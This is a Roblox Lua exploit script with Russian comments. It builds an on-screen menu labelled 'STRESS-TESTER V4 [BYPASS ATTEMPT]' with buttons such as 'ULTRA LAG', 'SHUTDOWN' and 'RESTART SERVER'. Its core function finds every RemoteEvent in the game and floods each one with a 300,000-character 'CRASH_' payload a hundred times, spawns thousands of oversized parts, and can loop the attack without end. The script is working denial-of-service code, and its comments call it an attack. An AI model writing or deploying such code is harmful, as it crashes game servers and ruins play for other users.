local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 320, 0, 420)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "STRESS-TESTER V4 [BYPASS ATTEMPT]"
Title.TextColor3 = Color3.new(1, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)

-- Функция для проверки: заблокировал сервер запрос или нет
local function FireRemote(remote, data)
    local success, err = pcall(function()
        remote:FireServer(data)
    end)
    return success
end

local function CreateComplexButton(name, pos, callback)
    local btn = Instance.new("TextButton", MainFrame)
    btn.Size = UDim2.new(0, 180, 0, 35)
    btn.Position = pos
    btn.Text = name
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    btn.TextColor3 = Color3.new(1, 1, 1)
    
    local modeLabel = Instance.new("TextLabel", btn)
    modeLabel.Size = UDim2.new(0, 100, 0, 35)
    modeLabel.Position = UDim2.new(1, 5, 0, 0)
    modeLabel.Text = "[ Local ]"
    modeLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    modeLabel.TextColor3 = Color3.new(0, 1, 0) -- Зеленый по умолчанию
    
    local modes = {"Local", "Server", "Except Me"}
    local currentMode = 1
    
    local modeBtn = Instance.new("TextButton", modeLabel)
    modeBtn.Size = UDim2.new(1, 0, 1, 0)
    modeBtn.BackgroundTransparency = 1
    modeBtn.Text = ""
    modeBtn.MouseButton1Click:Connect(function()
        currentMode = currentMode + 1
        if currentMode > 3 then currentMode = 1 end
        modeLabel.Text = "[ " .. modes[currentMode] .. " ]"
    end)

    btn.MouseButton1Click:Connect(function()
        callback(modes[currentMode])
    end)
end

-- АГРЕССИВНАЯ ЛОГИКА
local function ExecuteAttack(mode)
    print("--- ЗАПУСК АТАКИ: " .. mode .. " ---")
    
    -- Ищем ВСЕ доступные RemoteEvents в игре
    local remotes = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            table.insert(remotes, v)
        end
    end

    if mode == "Server" or mode == "Except Me" then
        if #remotes > 0 then
            print("Найдено ивентов: " .. #remotes)
            local payload = string.rep("CRASH_", 50000) -- Тяжелый груз
            
            -- Пытаемся пробить сервер через каждый ивент
            for i = 1, 100 do
                for _, r in pairs(remotes) do
                    FireRemote(r, payload)
                end
            end
        else
            warn("КРИТИЧЕСКАЯ ОШИБКА: Сервер полностью защищен (Remotes не найдены).")
        end
    end

    if mode == "Local" or mode == "Server" then
        -- Создаем лаг локально (если сервер не падает, упадет твой клиент)
        for i = 1, 2000 do
            Instance.new("Part", workspace).Size = Vector3.new(50, 50, 50)
        end
    end
end

-- КНОПКИ (Те же названия, новая логика)
CreateComplexButton("ULTRA LAG", UDim2.new(0, 10, 0, 50), ExecuteAttack)
CreateComplexButton("SHUTDOWN", UDim2.new(0, 10, 0, 95), function(m)
    while task.wait(0.1) do ExecuteAttack(m) end
end)
CreateComplexButton("RESTART SERVER", UDim2.new(0, 10, 0, 140), function(m)
    print("Попытка перегрузки для рестарта...")
    ExecuteAttack(m)
end)
-- ... (остальные кнопки добавляются аналогично)
